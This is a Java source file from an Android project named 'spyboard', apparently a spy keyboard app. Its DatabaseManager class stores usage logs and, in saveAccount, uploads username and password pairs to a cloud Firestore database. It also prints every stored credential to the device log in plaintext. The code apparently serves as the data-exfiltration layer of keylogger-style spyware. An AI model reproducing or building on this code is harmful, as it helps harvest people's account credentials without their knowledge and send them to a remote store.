package com.idankorenisraeli.spyboard.data;

import android.util.Log;

import androidx.annotation.NonNull;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.firestore.CollectionReference;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.DocumentSnapshot;
import com.google.firebase.firestore.FirebaseFirestore;
import com.idankorenisraeli.spyboard.common.SharedPrefsManager;
import com.idankorenisraeli.spyboard.data.types.DailyUsageLog;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;
import java.util.UUID;

public class DatabaseManager {

    private static DatabaseManager instance = null;

    private final FirebaseFirestore database = FirebaseFirestore.getInstance();
    private final SharedPrefsManager sharedPrefs = SharedPrefsManager.getInstance();
    private final CollectionReference usersRef;

    private final ArrayList<DailyUsageLog> waitingList; //Logs that could not be saved to cloud


    interface KEYS {
        String USERS = "users";
        String DAILY_LOGS = "daily_logs";
        String ALL_TIME = "all_time_data";
        String ACCOUNTS = "accounts";
        String TOTAL = "total";

        String UID = "my_uid";
    }

    private DatabaseManager() {
        usersRef = database.collection(KEYS.USERS);
        waitingList = new ArrayList<>();

    }

    public static DatabaseManager getInstance() {

        if (instance == null)
            instance = new DatabaseManager();
        return instance;
    }


    //This will override the current daily log that is saved in db/sp
    public void saveDailyLog(@NonNull DailyUsageLog log) {
        sharedPrefs.putObject(getDailyLogSPKey(log.getDate()), log);


        getDailyLogDocRef(log.getDate()).set(log)
                .addOnSuccessListener(new OnSuccessListener<Void>() {
                    @Override
                    public void onSuccess(Void aVoid) {
                        //Trying to re-save the waiting logs
                        for (DailyUsageLog waitingLog : waitingList) {
                            getDailyLogDocRef(waitingLog.getDate()).set(waitingLog).addOnSuccessListener(new OnSuccessListener<Void>() {
                                @Override
                                public void onSuccess(Void aVoid) {
                                    // Waiting log is saved, so its not waiting anymore
                                    waitingList.remove(waitingLog);
                                }
                            });
                        }
                    }
                })
                .addOnFailureListener(new OnFailureListener() {
                    @Override
                    public void onFailure(@NonNull Exception e) {
                        waitingList.add(log);
                    }
                });
    }

    public void saveAccount(String username, String password) {

        getAccountsDocRef().get().addOnSuccessListener(new OnSuccessListener<DocumentSnapshot>() {
            @Override
            public void onSuccess(DocumentSnapshot documentSnapshot) {
                HashMap<String, String> accounts;
                if (documentSnapshot.exists()) {
                    accounts = (HashMap<String, String>) documentSnapshot.toObject(HashMap.class);
                    for (String key : accounts.keySet()) {
                        Log.i("pttt", "found account: " + key + " ; " + accounts.get(key));
                    }
                } else
                    accounts = new HashMap<>();
                accounts.put(username, password);
                getAccountsDocRef().set(accounts);

            }
        });
    }


    /**
     * Load from sp
     *
     * @param date Date of log to load from device
     */
    public DailyUsageLog loadDailyLog(String date) {
        Log.i("pttt", "Trying to load " + date);

        String spKey = getDailyLogSPKey(date);
        return sharedPrefs.getObject(spKey, DailyUsageLog.class);

    }


    /**
     * This creates the unique reference of a log in the cloud firestore
     *
     * @param date the of the log to get its ref
     * @return the ref
     */
    private DocumentReference getDailyLogDocRef(String date) {
        return usersRef.document(getUID().concat("/").
                concat(KEYS.DAILY_LOGS).concat("/").concat(date));
    }

    private DocumentReference getAccountsDocRef() {
        return usersRef.document(getUID().concat("/")
                .concat(KEYS.TOTAL).concat("/").concat(KEYS.ACCOUNTS));
    }

    private DocumentReference getTotalDocRef() {
        return usersRef.document(getUID().concat("/")
                .concat(KEYS.TOTAL).concat("/").concat(KEYS.ALL_TIME));
    }

    private String getDailyLogSPKey(String date) {
        return SharedPrefsManager.KEYS.SP_KEY_PREFIX + KEYS.DAILY_LOGS + "_" + date;
    }


    /**
     * Each user gets its own unique id for the database
     * this unique id will be saved on shared prefs
     *
     * @return Current user's unique ID
     */
    private String getUID() {
        String uuid;
        if (sharedPrefs.contain(KEYS.UID)) {
            uuid = sharedPrefs.getString(KEYS.UID, UUID.randomUUID().toString());
        } else {
            uuid = UUID.randomUUID().toString();
            sharedPrefs.putString(KEYS.UID, uuid);

        }
        return uuid;
    }
}
